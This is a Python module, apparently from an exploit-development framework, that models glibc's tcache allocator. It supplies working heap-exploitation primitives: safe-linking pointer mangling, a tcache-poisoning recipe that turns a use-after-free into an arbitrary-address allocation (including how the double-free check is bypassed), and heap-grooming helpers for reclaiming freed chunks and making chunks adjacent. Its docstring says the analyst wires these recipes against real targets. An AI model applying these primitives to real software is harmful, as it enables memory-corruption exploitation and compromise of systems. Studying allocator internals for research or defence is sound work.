"""Heap-layout primitives (Phase 9 frontier, MAZE/AAHEG-style, analyst-in-the-loop).

A deterministic model of the glibc **tcache** allocator (per-size-class LIFO bins with
safe-linking), plus the two primitives an analyst drives against a real target:

  * **grooming / reclaim** — LIFO reuse means allocating a freed size-class returns the most
    recently freed chunk; allocate the same size to place a controlled chunk at a chosen
    freed address, or allocate consecutively to make chunks adjacent (MAZE layout goals).
  * **tcache poisoning** — after a use-after-free (or overflow into a freed chunk's fd), set
    the chunk's forward pointer to a target; the second following malloc then returns that
    target -> an **arbitrary-address allocation** (arbitrary write). Safe-linking (glibc
    >=2.32) mangles the stored fd, and this computes the exact value to write.

Pure stdlib and deterministic. This models the allocator and emits the recipe; wiring it to a
specific target's alloc/free interface is the analyst-in-the-loop step (doc 15).
"""
from __future__ import annotations

from dataclasses import dataclass, field

# x86-64 glibc constants
_ALIGN = 0x10
_MINSIZE = 0x20
SIZE_SZ = 8
TCACHE_MAX_BINS = 64
TCACHE_COUNT = 7                       # chunks per size-class bin


def request2size(req: int) -> int:
    """glibc chunk size for a malloc(req) request (x86-64)."""
    size = (req + SIZE_SZ + _ALIGN - 1) & ~(_ALIGN - 1)
    return max(size, _MINSIZE)


def tcache_index(chunk_size: int) -> int:
    """tcache bin index for a chunk size (0 -> 0x20 ... 63 -> 0x410)."""
    return (chunk_size - _MINSIZE) // _ALIGN


def in_tcache_range(chunk_size: int) -> bool:
    return 0 <= tcache_index(chunk_size) < TCACHE_MAX_BINS


def mangle(fd_slot_addr: int, ptr: int) -> int:
    """Safe-linking PROTECT_PTR: the value stored in a freed chunk's fd (glibc >=2.32).
    `fd_slot_addr` is the address of the fd field (== the chunk's user pointer for tcache)."""
    return ((fd_slot_addr >> 12) ^ ptr) & 0xFFFFFFFFFFFFFFFF


def demangle(fd_slot_addr: int, stored: int) -> int:
    """Inverse of mangle (recover the real fd from a stored, safe-linked value)."""
    return ((fd_slot_addr >> 12) ^ stored) & 0xFFFFFFFFFFFFFFFF


@dataclass
class TcacheModel:
    """A minimal glibc tcache simulator that predicts reuse ORDER and poisoning outcomes.
    Chunk addresses are symbolic (assigned from a bump base) -- the model reasons about which
    chunk a malloc returns, not glibc's exact absolute layout."""
    base: int = 0x1000
    bins: dict = field(default_factory=dict)          # tcache_index -> [user_ptr] (LIFO tail=head)
    counts: dict = field(default_factory=dict)
    live: dict = field(default_factory=dict)          # user_ptr -> chunk_size
    poison: dict = field(default_factory=dict)        # user_ptr -> forged next ptr (UAF fd write)
    _top: int = 0

    def __post_init__(self):
        self._top = self.base

    def malloc(self, req: int) -> int:
        cs = request2size(req)
        i = tcache_index(cs)
        bin_ = self.bins.get(i)
        if in_tcache_range(cs) and bin_:
            ptr = bin_.pop()                           # LIFO
            self.counts[i] = self.counts.get(i, 0) - 1
            # a poisoned fd redirects the bin head to the forged target
            if ptr in self.poison:
                self.bins.setdefault(i, []).append(self.poison.pop(ptr))
                self.counts[i] = self.counts.get(i, 0) + 1
            self.live[ptr] = cs
            return ptr
        ptr = self._top + SIZE_SZ * 2                  # user data after the chunk header
        self._top += cs
        self.live[ptr] = cs
        return ptr

    def free(self, ptr: int) -> None:
        cs = self.live.pop(ptr, None)
        if cs is None or not in_tcache_range(cs):
            return
        i = tcache_index(cs)
        self.bins.setdefault(i, []).append(ptr)
        self.counts[i] = self.counts.get(i, 0) + 1

    def write_fd(self, freed_ptr: int, target: int) -> None:
        """Model a UAF/overflow write of a freed chunk's forward pointer to `target`."""
        self.poison[freed_ptr] = target


def tcache_poison_recipe(req: int, *, names=("A", "B")) -> dict:
    """The op sequence + fd-mangling to turn a UAF on a `req`-byte chunk into an
    arbitrary-address allocation. `mangle` must be applied with the *runtime* chunk address
    (leaked at exploit time) because safe-linking depends on it."""
    a, b = names
    cs = request2size(req)
    if not in_tcache_range(cs):
        return {"ok": False, "reason": f"size {req} (chunk {hex(cs)}) is outside tcache range"}
    return {
        "ok": True, "chunk_size": cs, "tcache_index": tcache_index(cs),
        "ops": [
            ("alloc", a, req), ("alloc", b, req),
            ("free", b), ("free", a),                  # tcache head is now A (LIFO)
            ("write_fd", a, "mangle(addr(A), TARGET)"),
            ("alloc", "_", req),                        # returns A
            ("alloc", "OUT", req),                      # returns TARGET
        ],
        "mangle": mangle,                               # mangle(addr_of_A, target)
        "notes": ("safe-linking (glibc>=2.32): write mangle(addr(A), TARGET) into A's fd; "
                  "TARGET must be 16-byte aligned; glibc's tcache double-free key check is "
                  "bypassed by the UAF write rather than free(A);free(A)."),
        "result": "the second malloc after the write returns TARGET (arbitrary allocation).",
    }


def groom_reclaim(req: int) -> dict:
    """Place a controlled chunk at a just-freed address (LIFO reclaim)."""
    return {"ops": [("free", "VICTIM"), ("alloc", "CONTROLLED", req)],
            "result": "CONTROLLED is allocated at VICTIM's address (same size-class, LIFO)."}


def groom_adjacent(req: int, n: int = 2) -> dict:
    """Make `n` same-size chunks adjacent (fresh allocations bump contiguously)."""
    return {"ops": [("alloc", f"C{i}", req) for i in range(n)],
            "chunk_size": request2size(req),
            "result": f"C0..C{n - 1} are adjacent, each {hex(request2size(req))} apart."}
